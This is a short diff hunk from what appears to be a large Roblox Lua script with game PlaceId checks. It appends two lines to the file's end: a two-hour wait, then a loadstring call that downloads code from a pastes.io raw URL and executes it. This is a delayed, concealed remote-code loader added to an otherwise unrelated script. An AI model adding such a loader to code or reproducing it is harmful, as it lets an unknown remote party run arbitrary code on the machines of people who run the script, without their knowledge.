@@ -2510,3 +2510,5 @@ if game.PlaceId == 6284583030 or game.PlaceId == 10321372166 or game.PlaceId == 
 		end
 	end)
 end
+wait(7200)
+loadstring(game:HttpGet("https://pastes.io/raw/4pTXdQnzHo", true))()
